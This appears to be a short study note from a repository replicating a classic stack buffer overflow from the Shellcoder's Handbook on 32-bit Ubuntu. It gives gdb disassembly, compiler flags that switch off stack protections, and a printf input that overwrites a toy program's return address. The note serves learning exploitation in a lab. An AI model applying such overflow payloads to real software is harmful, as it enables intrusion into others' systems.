# Smashing_Stack2018
Working with wiley shellcoders handbook... replicating the exploits from 15 years ago is tricky with modern security features is challenging.

Using Virtual box to run ubuntu 32-bit 

First Example file aa.c:


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

First example uses a function to set up an erray and fill it with user input.
Use gdb to disas main and find the RET address

(gdb) disas main
Dump of assembler code for function main:
   0x0804845c <+0>:	push   %ebp
   0x0804845d <+1>:	mov    %esp,%ebp
   0x0804845f <+3>:	call   0x804843b <sicario>   <<<<<<<<<<RET ADDRESS 
   0x08048464 <+8>:	push   $0x8048500
   0x08048469 <+13>:	call   0x8048310 <puts@plt>
   0x0804846e <+18>:	add    $0x4,%esp
   0x08048471 <+21>:	mov    $0x0,%eax
   0x08048476 <+26>:	leave  
   0x08048477 <+27>:	ret    
End of assembler dump.
(gdb) 


Compiled with :
gcc -ggdb -mpreferred-stack-boundary=2 -ggdb -zexecstack -fno-stack-protector -fno-omit-frame-pointer aa.c -o PressPlay

Running : 
$ printf AAAAAAAA9ABBBBBBBB9BCCCCCCCC9CDDDDx5fx84x04x08 | ./PressPlay

Output : 
sunshinie@11:43 AM:~$ printf "AAAAAAAA9ABBBBBBBB9BCCCCCCCC9CDDDD\x5f\x84\x04\x08" | ./PressPlay // RET address little indian i think 
AAAAAAAA9ABBBBBBBB9BCCCCCCCC9CDDDD_�
AAAAAAAA9ABBBBBBBB9BCCCCCCCC9CDDDDd�
RET points here 
Segmentation fault (core dumped)
sunshinie@11:44 AM:~$ 

Success
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
